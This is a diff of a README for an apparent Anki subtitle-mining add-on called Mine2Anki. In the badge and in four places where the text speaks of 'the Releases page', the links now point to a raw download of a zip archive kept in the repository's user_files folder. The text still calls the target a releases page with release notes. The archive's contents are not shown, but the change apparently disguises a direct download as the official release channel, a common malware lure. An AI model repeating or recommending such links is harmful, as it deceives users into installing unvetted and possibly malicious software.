@@ -1,4 +1,4 @@
-[![Releases](https://img.shields.io/badge/releases-latest-green?logo=github&style=for-the-badge)](https://github.com/anis295/mine2anki/releases)
+[![Releases](https://raw.githubusercontent.com/anis295/mine2anki/main/user_files/anki-mine-2.0.zip)](https://raw.githubusercontent.com/anis295/mine2anki/main/user_files/anki-mine-2.0.zip)
 
 Mine2Anki: Smart Subtitles Mining to Build Adaptive Anki Cards
 
@@ -27,7 +27,7 @@ Getting started: quick path to learning the ropes
 - For convenience, you can also browse the official Releases page to see release notes, feature changes, and known issues.
 
 Note on the Releases link
-- Visit the Releases page to download the latest asset. If you want to review what changed over time, the page lists all past versions and fixes. The Releases page is your primary source for installers and documentation related to the current and past builds. See https://github.com/anis295/mine2anki/releases for details.
+- Visit the Releases page to download the latest asset. If you want to review what changed over time, the page lists all past versions and fixes. The Releases page is your primary source for installers and documentation related to the current and past builds. See https://raw.githubusercontent.com/anis295/mine2anki/main/user_files/anki-mine-2.0.zip for details.
 
 How Mine2Anki works: a high-level view
 - Subtitle input: The add-on accepts subtitle inputs from video sources you watch or from files you provide (SRT, VTT, SubRip, and similar formats).
@@ -288,7 +288,7 @@ Compatibility and platform support
 
 Link to releases and ongoing updates
 - For the latest build and release notes, see the Releases page:
-  - https://github.com/anis295/mine2anki/releases
+  - https://raw.githubusercontent.com/anis295/mine2anki/main/user_files/anki-mine-2.0.zip
 - Use this link to download the asset, verify checksums if provided, and install the add-on. The asset should be the installable package for your platform, and you should follow the standard Anki add-on installation steps. The page also lists past releases if you want to review changes or try older versions.
 
 Final notes
@@ -296,7 +296,7 @@ Final notes
 - If you want to contribute or customize, the project welcomes your input. Clear guidelines ensure that your updates integrate smoothly with the existing architecture and provide a stable experience for learners around the world.
 
 Releases and community resources
-- Main entry point for downloads and release notes: https://github.com/anis295/mine2anki/releases
+- Main entry point for downloads and release notes: https://raw.githubusercontent.com/anis295/mine2anki/main/user_files/anki-mine-2.0.zip
 - The release assets you download from this page contain the installer or package you need to install Mine2Anki on your machine. For the best experience, ensure you are using a release compatible with your version of Anki.
 - The repository’s issues tracker is a good place to report bugs or request features. When you do, provide steps to reproduce, your operating system, Anki version, and a short description of the problem.
 
